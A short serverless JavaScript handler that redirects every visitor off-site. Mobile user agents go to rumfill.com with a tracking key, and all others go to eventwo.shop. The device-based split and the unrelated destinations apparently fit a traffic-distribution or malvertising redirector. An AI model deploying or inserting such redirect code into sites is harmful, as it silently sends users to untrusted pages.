export async function onRequest(context) {
    const ua = context.request.headers.get("user-agent") || "";

    const isMobile =
        /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);

    if (isMobile) {
        return Response.redirect(
            "https://rumfill.com/jtdyzwx9dp?key=6ceffee47be217154eecc6045d5bb044",
            302
        );
    }

    return Response.redirect(
        "https://eventwo.shop/ksmx/",
        302
    );
}
